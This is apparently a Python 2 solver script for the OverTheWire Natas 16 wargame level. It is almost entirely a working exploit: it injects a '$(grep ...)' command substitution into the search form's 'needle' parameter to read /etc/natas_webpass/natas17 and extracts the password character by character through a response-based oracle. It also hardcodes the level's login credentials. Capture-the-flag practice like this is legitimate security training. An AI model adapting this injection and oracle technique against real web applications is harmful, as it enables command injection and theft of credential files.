#!/usr/local/bin/python

import sys
import requests
import base64
import string
import time

#print "First argument is " + str(sys.argv[1])

url = 'http://natas16.natas.labs.overthewire.org/'

prx = {
  'http': 'http://127.0.0.1:8080',
  'https': 'http://127.0.0.1:8080',
}


charseq = list(string.ascii_lowercase + string.ascii_uppercase + "0123456789")
req_data_fist = '?needle=%24(grep+-E+^'
req_data_last = '.*%24 /etc/natas_webpass/natas17)eloquentl&submit=Search'
pwd = "8Ps3H0GWbn5rd9S7GmAdgQNdkh"

for i in range(0,32):
    for char in charseq:
        #hdrs = {'Content-Type': 'application/x-www-form-urlencoded'}
        hdrs = {}
        req_data = req_data_fist + pwd + char + req_data_last
        #req_data = "username=natas16"
        print req_data
        r = requests.get(url + req_data, headers=hdrs, auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'), proxies=prx)
        #time.sleep(0.5)
        if "eloquently" not in r.content:
            pwd+=char
            print "\nFound char " + char + "\n"
            break

#print resp.read()
